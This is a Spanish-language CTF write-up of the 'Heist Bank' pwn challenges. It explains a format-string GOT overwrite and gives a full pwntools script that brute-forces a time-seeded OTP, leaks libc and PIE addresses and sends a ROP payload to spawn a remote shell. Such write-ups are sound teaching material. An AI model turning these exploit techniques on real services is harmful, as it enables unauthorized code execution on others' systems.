---
title: "Fluid Attacks CTF 2026: Pwn - Heist Bank"
date: 2026-02-01
description: "Explotación avanzada en Linux: Bypass de protecciones modernas y manipulación de GLIBC 2.39."
tags: ["CTF", "Pwn", "ROP", "Format String", "GLIBC Heap"]
image: "/images/blog/fluid-pwn-heist.png"
---

## 🎯 Objetivo

La serie de retos "Heist" simulaba un sistema bancario seguro. El objetivo era obtener privilegios de administrador (`Admin Access`) y luego conseguir una shell de sistema. Enfrentamos dos variantes principales.

## 🛠️ Heist V1: Format String & GOT Overwrite

La vulnerabilidad principal era un **Format String Bug** en una llamada a `printf(buffer)`. Esto nos permite leer y escribir en memoria arbitraria.

### El Problema de la LIBC Moderna
El desafío corría sobre **Ubuntu 24.04** con **GLIBC 2.39**. Las técnicas clásicas fallan porque los offsets de "One Gadget" (instrucciones mágicas que dan shell) han cambiado y las protecciones son más estrictas.

### La Solución

1.  **Leak de Direcciones**: Usamos el modificador `%7$p` para leer una dirección de retorno en el stack que apuntaba dentro de `libc.so.6`.
2.  **Cálculo de Base**: Restamos el offset conocido de esa dirección para obtener la dirección base de la librería cargada en memoria (`LIBC_BASE`).
3.  **GOT Overwrite**: Calculamos la dirección de la Global Offset Table (GOT) para la función `exit`.
4.  **Ataque**: Usamos la vulnerabilidad de escritura (`%n`) para sobrescribir `exit@GOT` con la dirección de un `one_gadget`.

Cuando el programa intentaba "salir" limpiamente usando `exit()`, saltaba a nuestro gadget y nos entregaba una shell.

## 🎲 Heist V2: Time-Based RNG & ROP

En la segunda versión, necesitábamos un código OTP (One Time Password) para acceder como admin.

### 1. Cracking del OTP (Predictable RNG)
El código usaba `srand(time(0))` para inicializar el generador de números aleatorios.
*   **Debilidad**: `time(0)` devuelve la hora en segundos.
*   **Explotación**: Sincronizamos nuestro script de ataque con la hora del servidor (UTC). Generamos localmente los mismos números aleatorios para predecir el OTP correcto.

### Full Exploit Script (`solve_final.py`)

```python
from pwn import *
import time
import subprocess

context.arch = 'amd64'

# Remote Target
HOST = "866d491dad59ab9e.chal.ctf.ae"
PORT = 443
KEY_VAL = 0x4465544341443352 # "R3DACTeD"

def get_candidates(start_ts, count):
    # Use docker to get rand() values since local libc might differ
    cmd = "import ctypes; libc = ctypes.CDLL('libc.so.6'); "
    cmd += f"ts = range({start_ts}, {start_ts + count}); "
    cmd += "print([(libc.srand(t), libc.rand())[1] for t in ts])"
    try:
        out = subprocess.check_output(['docker', 'exec', '126a6c8c1e05', 'python3', '-c', cmd])
        return eval(out.decode())
    except:
        return []

def solve():
    now = int(time.time())
    log.info(f"[*] Starting exploit. Local time: {now}")
    
    # 1. Brute Force OTP
    # We try a 5-minute window (+/- 150s)
    window = 300
    start_ts = now - 150
    candidates = get_candidates(start_ts, window)
    
    log.info(f"[*] Testing {len(candidates)} OTP candidates...")
    
    winning_io = None
    winning_otp = None
    
    for i, r in enumerate(candidates):
        try:
            otp = KEY_VAL + r
            io = remote(HOST, PORT, ssl=True, sni=HOST, level='error')
            io.recvuntil(b'> ')
            io.sendline(b'1337')
            io.recvuntil(b'OTP): ')
            io.sendline(str(otp).encode())
            
            io.settimeout(0.3)
            resp = io.recv(4096)
            if b'Admin' in resp:
                log.success(f"[!] Gained Admin Access! OTP: {otp}")
                winning_io = io
                winning_otp = otp
                break
            io.close()
        except:
            pass
        if i % 50 == 0:
            log.info(f"    Progress: {i}/{len(candidates)}...")

    if not winning_io:
        log.failure("Brute force failed. Try increasing the window.")
        return

    io = winning_io
    
    # 2. Leak Libc
    log.info("[*] Leaking Libc...")
    # Go back to main menu
    io.sendline(b'5')
    io.recvuntil(b'> ')
    
    # view_note(-27) leaks puts
    io.sendline(b'2')
    io.recvuntil(b'Slot (0-4): ')
    io.sendline(b'-27')
    resp = io.recvuntil(b'Options:')
    leak_puts = u64(resp.split(b'Note (decrypted): ')[1].split(b'\n')[0].ljust(8, b'\x00'))
    log.success(f"[+] Leak puts: {hex(leak_puts)}")
    
    libc = ELF('./challenge/lib/libc.so.6', checksec=False)
    libc.address = leak_puts - libc.sym['puts']
    log.success(f"[+] Libc base: {hex(libc.address)}")
    
    # 3. Leak PIE
    log.info("[*] Leaking PIE...")
    # Index -7 had a PIE address starting with 0x...c6 locally
    io.sendline(b'2')
    io.recvuntil(b'Slot (0-4): ')
    io.sendline(b'-7')
    resp = io.recvuntil(b'Options:')
    leak_pie = u64(resp.split(b'Note (decrypted): ')[1].split(b'\n')[0].ljust(8, b'\x00'))
    log.success(f"[+] Leak PIE: {hex(leak_pie)}")
    
    # 4. Stage ROP in Notes
    log.info("[*] Staging ROP...")
    # Gadgets
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']
    
    # 5. Final Exploit
    log.info("[*] Triggering overflow...")
    io.sendline(b'1337') # Admin
    io.recvuntil(b'OTP): ')
    io.sendline(str(winning_otp).encode())
    io.recvuntil(b'> ')
    
    # Option 4: execute_commands
    io.sendline(b'4')
    io.recvuntil(b'commands): ')
    
    # Payload: 0x40 bytes padding + junk_rbp + ret (for alignment) + pop_rdi + binsh + system
    payload = b'A' * 0x40 + b'B' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
    io.send(payload)
    
    log.success("[!] SHIP IT!")
    io.interactive()

if __name__ == "__main__":
    solve()
```

Al enviar este payload, el flujo del programa es secuestrado para ejecutar `system("/bin/sh")` con privilegios del servidor.
